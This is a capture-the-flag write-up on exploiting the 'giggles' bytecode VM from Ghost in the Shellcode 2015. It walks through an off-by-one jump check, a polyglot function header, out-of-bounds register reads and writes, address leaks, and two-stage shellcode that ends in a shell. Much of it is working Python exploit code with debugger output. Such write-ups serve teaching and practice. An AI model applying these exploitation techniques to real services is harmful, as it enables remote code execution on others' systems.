*giggles* was an exploitation challenge worth 300 points at the "Ghost in the
Shellcode" CTF 2015.

We are provided with remote access to some kind of bytecode-based virtual machine
and an [example client script written in Python](https://github.com/kitctf/writeups/blob/master/gits2015/giggles/client.py)
to access it. We also get the
[source code](https://github.com/kitctf/writeups/blob/master/gits2015/giggles/giggles.c)
of the [server binary](https://github.com/kitctf/writeups/blob/master/gits2015/giggles/giggles), which saves us some tedious reverse engineering.

After establishing a TCP connection with the server, the example client script
glues together some byte code:

{% highlight python %}
operations = createOperation(OP_ADD, 4, 0, 0)
operations += createOperation(OP_ADD, 2, 3, 0)
operations += createOperation(OP_BGT, 0, 1, 2)
operations += createOperation(OP_OUT, 4, 0, 0)
{% endhighlight %}

Looking at the server code, the VM supports 7 different instructions:

* `OP_ADD(dest, src)` adds the value of register `src` to that of register `dest`
* `OP_MOV(dest, src)` sets the value of register `dest` to that of register `src`
* `OP_OUT(reg)` sends the value of register `reg` over the network to the client
* `OP_BEQ/OP_GT(jmp_target, reg1, reg2)` are conditional jumps to instruction
  `jmp_target` that are taken when the value of `reg1` is equal to / greater
  than that of `reg2`, respectively
* `OP_BR(jmp_target)` is a conditional jump to instruction 0.
* `OP_EXIT()` leaves the function

This is the representation of an instruction in the server:

{% highlight cpp %}
struct __attribute__ ((__packed__)) operation
{
    uint16_t opcode;
    uint64_t operand1;
    uint64_t operand2;
    uint64_t operand3;
};
{% endhighlight %}

The example script then proceeds to send the byte code to the server
and register it as a function using the `ADDFUNC` command:

{% highlight python %}
function = createFunction(4, 2, operations)
{% endhighlight %}

We note that 2 is specified as the number of function parameters. This is
however wrong, actually 4 arguments are provided when the function is called
later. In fact the value provided here is totally ignored by the server.

The corresponding handler on the server side adds the function to a global
array of function structures:

{% highlight cpp %}
struct __attribute__ ((__packed__)) function
{
    uint16_t num_ops;
    uint16_t num_args;
    uint8_t verified;
    struct operation bytecode[MAX_OPS];
};
uint32_t num_funcs = 0;
struct function funcs[MAX_FUNCS];
{% endhighlight %}

Initially the instructions are just copied verbatim from the client, but the
function is marked as unverified, so it cannot be called yet. To mark it as
verified, the example client explicity calls the `VERIFY` command with the
index of the function as an argument:

{% highlight python %}
verifyFunction(sockfd, 0)
{% endhighlight %}

The server then checks the bytecode in an attempt to prevent out-of-bounds
operands, but fails to do so (more on this later). It then marks the function
as verified and we can call it:

{% highlight python %}
# this will output 12, the result of 3 * 4
print int(runFunction(sockfd, 0, [3, 4, 0, 1]), 16)
{% endhighlight %}

Great, so know we have a basic idea of what the protocol is and what the VM
can do. Let's exploit it.

## The bug

As mentioned, the `verifyBytecode` function is buggy:

{% highlight cpp %}
    for (i = 0; i < n_ops; i++)
    {
        switch (bytecode[i].opcode)
        {
            // [...]
            case OP_BR:
                if (bytecode[i].operand1 > n_ops)
                    return 0;
                break;
            // [...]
        }
    }
{% endhighlight %}

There is an off-by-one error: If the operand is equal to `n_ops`, the jump is
allowed although the target instruction is out of range. We can exploit this by
defining a function with `MAX_OPS` instructions and have it jump to `MAX_OPS`.
The program counter will then end up in the header of the following function.
We just have to construct a function header that is also a valid, useful
instruction.

## The exploit

Our plan now is to construct a function that is also a valid jump instruction.
The memory layouts of the two structures compare as follows:

    interpreted as function:
    +--------------+--------------+--------------+--------------+----------+------
    | num_ops (16) | num_args(16) | verified (8) | op_code (16) | op1 (64) | ...
    +--------------+--------------+--------------+--------------+----------+------

    interpreted as jump instruction:
    +--------------+-------------------------------------------------+------
    | OP_BR (16)   | jump target (64)                                | ...
    +--------------+-------------------------------------------------+------

We can easily set `num_ops = OP_BR`, which happens to have the value 1. The jump
target is pretty much arbitrary, since `num_args` is ignored and we can control it.
We only have to make sure that there is a null byte in the correct position,
because `verified = 0` is set by the server.

Here is the code to create our trampoline function and function/instruction polyglot:

{% highlight python %}
operations = ""
for _ in xrange(30):
    operations += createOperation(OP_BR, 30, 0, 0)
trampoline_func = createFunction(30, 0, operations)
addFunction(sockfd, trampoline_func)
verifyFunction(sockfd, 0)

s = struct.pack("<HQ", 1, jmp_target) + "A"*5
num_ops, num_args, verified, opcode, op1 = struct.unpack("<HHBHQ", s)
assert num_ops == OP_BR
assert verified == 0

polyglot_func = createFunction(num_ops, num_args, createOperation(opcode, op1, 0, 0))
addFunction(sockfd, polyglot_func)
{% endhighlight %}

Now the tedious part is figuring out where to jump. We decided to just jump
into an unverified function that we define later, so we get to execute
arbitrary bytecode without bounds checking. The problem is that an instruction
structure is 26 bytes in size and a function structure *5 + 30 · 26 = 785*
bytes, so it is not obvious how to align the instructions properly. We can use
as many functions as we want as padding (as soon as there are less than
`MAX_FUNCS`, which is set generously to 64). The offset the first instruction of
function *X* is *785 · X + 5*. The offset of the *Y*th instruction of the first
function is *5 + 26 · Y*. We need to equate the two:

    785 · X + 5 = 5 + 26 · Y

The solution with the smallest positive *X* is *X = 26* and *Y = 785*.  So we
have to add 24 functions as padding and we need to jump to instruction 785.
This is the setup code that makes a connection and adds all the boilerplate
functions:

{% highlight python %}
def preamble():
    #sockfd = socket.create_connection(('localhost', 1423))
    sockfd = socket.create_connection(('giggles.2015.ghostintheshellcode.com', 1423))

    ins_size = 2 + 3*8
    func_size = 2 + 2 + 1 + 30*ins_size
    jmp_target = func_size

    # add the initial, verified function with out of bounds jump
    operations = ""
    for _ in xrange(30):
        operations += createOperation(OP_BR, 30, 0, 0)
    trampoline_func = createFunction(30, 0, operations)
    addFunction(sockfd, trampoline_func)
    verifyFunction(sockfd, 0)

    # add polyglot function
    s = struct.pack("<HQ", 1, jmp_target) + "A"*5
    num_ops, num_args, verified, opcode, op1 = struct.unpack("<HHBHQ", s)
    assert num_ops == OP_BR
    assert verified == 0

    polyglot_func = createFunction(num_ops, num_args, createOperation(opcode, op1, 0, 0))
    addFunction(sockfd, polyglot_func)

    # padding
    for _ in xrange(ins_size - 2):
        addFunction(sockfd, createFunction(1,0,createOperation(0,0,0,0)))

    return sockfd
{% endhighlight %}

The function we add *after this* is the one that is going to get called eventually
if we call the *first* function. Now we can run arbitrary bytecode! E.g., here
is a function that reads the `w`th register value, without bounds checking:

{% highlight python %}
def read_relative(w):
    sockfd = preamble()
    operations = createOperation(OP_OUT, w+1, 0, 0)
    operations += createOperation(OP_OUT, w, 0, 0)
    addFunction(sockfd, createFunction(2, 0, operations))
    s = runFunction(sockfd, 0, [])
    return int("".join(s.split()), 16)
{% endhighlight %}

It actually uses two `OP_OUT` instructions to read a 64-bit value. This will
basically return `*(uint64_t*)(registers + w)`. To verify that this works, we can
run the server in a debugger. We had to NOP out a call to `alarm` to avoid being
interrupted while debugging. This shows a call to `read_relative(1337)`:

    $ gdb -p 4077 ./giggles
    ...
    (gdb) set follow-fork-mode child
    (gdb) break giggles.c:121

    $4 = {opcode = 5, operand1 = 1337, operand2 = 0, operand3 = 0}
    (gdb)

Clearly the operands are out of bounds. At this point we have an arbitrary read
and write (via `OP_MOV`) relative to the `registers` array. Turning this into
an absolute read/write is easy too, if we can leak the address of the `registers`
array. Conveniently, it is located on the stack and we can determine its exact
location from the value of the saved frame pointer:

    (gdb) x/20gx registers
    0x7fff59040d90:	0x0000000000000000	0x0000000000000000
    0x7fff59040da0:	0x0000000000000000	0x0000000000000000
    0x7fff59040db0:	0x0000000000000000	0x00007f19ed0855d8
    0x7fff59040dc0:	0x00007fff59002030	0x0000000000000004
    0x7fff59040dd0:	0x00007f19ee744574	0x65b948277f4f3b00
    0x7fff59040de0:	0x0000000000000000	0x0000000000000000
    0x7fff59040df0:	0x00007fff59040e50 <--  0x00007f19ed085efd
    0x7fff59040e00:	0x00007f19ed08611c	0x0000000400000000
    0x7fff59040e10:	0x00000000000402ed	0x00007f19ee744570
    0x7fff59040e20:	0x00007f19ee7445c0	0x00007f19ee744570
    (gdb) p 0x00007fff59040e50 - 0x7fff59040d90
    $6 = 192

So let's compute the address of the `register` array and, while we're at it, let's
also read the saved return address to compute the base address of our binary:

{% highlight python %}
register_base = read_relative(24) - 192
print "[*] register base =", hex(register_base)
exe_base = read_relative(26) - 0x1efd
print "[*] exe base =", hex(exe_base)
{% endhighlight %}

Now we can calculate the offset of arbitrary addresses, relative to `registers`:

{% highlight python %}
def calc_abs(addr):
    assert (addr - register_base) % 4 == 0
    return ((addr - register_base) / 4) % (2**64)
{% endhighlight %}

At this point we thank the authors of the challenge for this nice gimmick:

{% highlight cpp %}
void * JIT;     // TODO: add code to JIT functions
int handleConnection(int sockfd)
{
    void * value = 0;
    JIT = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // [...]
{% endhighlight %}

This buffer is where we want to store our shellcode. To do that, we read
the value of the pointer `JIT`, which is located in the `.bss` segment of the binary.
We then use a sequence of `OP_MOV`s to overwrite the buffer and the return address:

{% highlight python %}
jit_ptr = 0x20f5c0
buf = read_relative(calc_abs(exe_base + jit_ptr))
print "[*] jit buffer =", hex(buf)

assert len(stage1) == 28
operations = [
    # overwrite ret addr
    createOperation(OP_MOV, 26, 0, 0),
    createOperation(OP_MOV, 27, 1, 0)
]
# write shellcode
for i in xrange(7):
    operations.append(createOperation(OP_MOV, calc_abs(buf+4*i), 2+i, 0))
operations += [
    createOperation(OP_EXIT, 0, 0, 0),
]

addFunction(sockfd, createFunction(len(operations), 0, "".join(operations)))
args = [buf&0xffffffff, buf>>32] + list(struct.unpack("IIIIIII", stage1))
runFunction(sockfd, 0, args, wait=0)
{% endhighlight %}

The way function arguments work in our little VM is that they are copied verbatim
into the registers before the function executes. I.e. argument 0 goes into register 0
etc.  It is slightly annoying that we have only 9 arguments that we can pass, so
our stage 1 shellcode can only have 28 bytes. We use a `read` syscall to load stage 2
right after stage1:

{% highlight python %}
stage1 = x86_64.assemble("""
    push 4   ; this is the socket fd
    pop rdi
    mov rsi, {buf}
    push 0xff
    pop rdx
    mov rax, 0
    syscall
    """.format(buf=buf+28))
stage1 += "\x90"*(28 - len(stage1))
{% endhighlight %}

And we choose to also reuse the socket file descriptor for our final shell:

{% highlight python %}
stage2 = (
    # this code just calls dup2(rdi,0); dup2(rdi,1); dup2(rdi,2)
    x86_64_shellcode.dup2_rdi +
    # and then spawns a shell
    x86_64_shellcode.shell
)
assert len(stage2) <= 0xff
{% endhighlight %}

The [final exploit](https://github.com/kitctf/writeups/blob/master/gits2015/giggles/exploit.py)
in action:

    $ python2 exploit.py
    [*] register base = 0x7fffb7b91900
    [*] exe base = 0x7fef16437000
    [*] jit buffer = 0x7fef16431000
    [*] Enjoy your shell :)
    ls
    client.py
    giggles
    giggles.c
    key
    cat key
    I can't think of anything creative to put in here right now

And yes, it used to give you the flag during the contest :)
